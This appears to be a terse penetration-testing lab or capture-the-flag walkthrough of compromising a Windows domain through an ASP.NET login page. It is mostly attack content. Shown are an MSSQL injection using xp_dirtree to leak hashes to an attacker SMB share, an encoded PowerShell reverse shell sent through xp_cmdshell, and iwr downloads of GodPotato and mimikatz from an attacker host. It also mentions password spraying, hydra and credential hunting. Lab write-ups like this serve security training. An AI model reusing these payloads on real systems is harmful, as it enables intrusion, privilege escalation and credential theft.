#box 

### 121 
- Username field was vulnerable
- Extracted hashes using the below command as the database is MSSQL
```sql
1'; use master; exec xp_dirtree '\\192.168.45.178\smb';--
```

```ASP
__VIEWSTATE=%2FwEPDwUKMjA3MTgxMTM4Nw9kFgJmD2QWAgIDD2QWAgIBD2QWAgIHDw8WAh4EVGV4dAUmSW52YWxpZCBjcmVkZW50aWFscy4gUGxlYXNlIHRyeSBhZ2Fpbi5kZGQ6ANQ%2BZinGNG41JvoxdgmEmQZ5mPmfmkkqoJF0u3XSeg%3D%3D&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=%2FwEdAATe8ooRy1yZbe5QReMilY6mG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb61gAUK1Up19u%2Fe2ttdYdr5kv82bbq4%2FbiNxm9IDXrF1w%3D&ctl00%24ContentPlaceHolder1%24UsernameTextBox=1'%3b+use+master%3b+exec+xp_dirtree+'\\192.168.45.178\smb'%3b--&ctl00%24ContentPlaceHolder1%24PasswordTextBox=pass&ctl00%24ContentPlaceHolder1%24LoginButton=Login
```
- Got the reverse shell using 
```sql
' EXEC xp_cmdshell "net user"; EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'; EXEC master.dbo.xp_cmdshell 'net use \\192.168.45.178\smb';
```

```HTML
'+EXEC+xp_cmdshell+"net+user"%3b+EXEC+master.dbo.xp_cmdshell+'cmd.exe+dir+c%3a'%3b+EXEC+master.dbo.xp_cmdshell+'powershell+-e+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANwA4ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA%2bACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA%2bACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA%3d%3d'%3b--
```

- Escalated privileges using GodPotato-NET4 as the server was 

OS Name:                   Microsoft Windows Server 2022 Standard
OS Version:                10.0.20348 N/A Build 20348

```powershell
iwr -uri http://192.168.45.169/GodPotato/GodPotato-NET4.exe -Outfile g4.exe
```

```powershell
iwr -uri http://192.168.45.169/mimikatz.exe -Outfile m.exe
```

- Used Conpty shell as the main shell to execute the staged msfvenom payloads
- Sprayed Joes password across the machined and pawnd fileserver
- Used Sharp hound and found a DA in Dev server. 
- Checked all files in user directory and found SQL passwords and Backup log
```powershell
Get-ChildItem -Path C:\Users -Include * -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
ls C:\TEMP
```
- Found files using above query and dumped passwords to all the way to DEV04
- Found a backup file that could be used to escalate privileges.
- Added all the passwords to seperate password and user files and ran hydra to get access to 120
- Below can find the flags
```powershell
Get-ChildItem -Path C:\ -Include proof.txt, local.txt -File -Recurse -ErrorAction SilentlyContinue | Get-Content
```